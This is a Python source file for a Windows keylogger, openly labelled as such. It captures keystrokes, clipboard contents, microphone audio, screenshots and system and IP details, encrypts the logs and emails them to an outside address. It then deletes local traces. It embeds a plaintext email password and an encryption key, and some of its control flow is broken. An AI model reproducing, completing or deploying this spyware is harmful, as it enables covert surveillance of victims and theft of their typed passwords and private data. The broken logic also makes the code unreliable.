#Advance feature of keylogger

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

import requests

url = "http://8.8.8.8/"

timeout = 10

try:
    request = requests.get(url, timeout=timeout)
    internet = 'OK'
except (requests.ConnectionError, requests.Timeout) as exception:
    internet = 'NO'

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import urllib3

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 30
time_iteration = 15
number_of_iterations_end = 3

email_address = "arinzejustinng@gmail.com"  # Enter disposable email here
password = "arinzejustinng@#1"  # Enter email password here

username = getpass.getuser()

toaddr = "me@arinzejustinng.com.ng"  # Enter the email address you want to send your information to

key = "6JkAHeppLqFCJ1RHLSrxm6K37285l96OmdjiGt00wZg="  # Generate an encryption key from the Cryptography folder

# Create directory to store the file

profile_user = os.environ['USERPROFILE']

directory = 'temp'

parent_dir = profile_user

path = os.path.join(parent_dir, directory)

os.makedirs(path, exist_ok=True)

file_path = path + '\\'  # Enter the file path you want your files to be saved to

http = urllib3.PoolManager()

# email controls
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


# send_email(keys_information, file_path + keys_information, toaddr)


# get the computer information
def computer_information():
    with open(file_path + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()


# get the clipboard contents
def copy_clipboard():
    with open(file_path + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data + '\n')

        except:
            f.write("Clipboard could be not be copied")


copy_clipboard()


# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + audio_information, fs, myrecording)


microphone()


# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + screenshot_information)


screenshot()

number_of_iterations = 3
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        # send_email(screenshot_information, file_path + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_path + system_information, file_path + clipboard_information, file_path + keys_information]
encrypted_file_names = [file_path + system_information_e, file_path + clipboard_information_e,
                        file_path + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

if internet != 'OK':
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1
    time.sleep(120)
    # Clean up our tracks and delete files
    delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
    for file in delete_files:
        os.remove(file_path + file)
